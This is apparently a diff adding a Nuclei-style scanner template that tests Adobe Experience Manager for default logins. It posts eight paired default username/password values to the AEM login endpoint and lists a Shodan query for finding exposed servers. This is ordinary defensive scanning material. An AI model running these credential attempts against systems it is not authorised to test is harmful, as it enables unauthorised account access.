@@ -1,0 +1,67 @@
+id: aem-default-login
+
+info:
+  name: Adobe AEM Default Login
+  author: random-robbie
+  severity: high
+  description: Adobe AEM default login credentials were discovered.
+  reference:
+    - https://experienceleague.adobe.com/docs/experience-manager-64/administering/security/security-checklist.html?lang=en
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 8
+    shodan-query: http.component:"Adobe Experience Manager"
+    product: experience_manager
+    vendor: adobe
+  tags: aem,default-login,adobe
+
+http:
+  - raw:
+      - |
+        POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/libs/granite/core/content/login.html
+
+        _charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
+
+    attack: pitchfork
+    payloads:
+      aem_user:
+        - admin
+        - grios
+        - replication-receiver
+        - vgnadmin
+        - author
+        - anonymous
+        - jdoe@geometrixx.info
+        - aparker@geometrixx.info
+      aem_pass:
+        - admin
+        - password
+        - replication-receiver
+        - vgnadmin
+        - author
+        - anonymous
+        - jdoe
+        - aparker
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - login-token
+          - crx.default
+        condition: and
+# digest: 490a0046304402200a1b385e9cceb671454d7c83c221f78b567e022ac25fc0ce8c8e253990df8fba022003d3b71eff6d9ee5f7fc2273dbf71939953267f5e99c52347839b089d76ad91f:922c64590222798bb761d5b6d8e72950
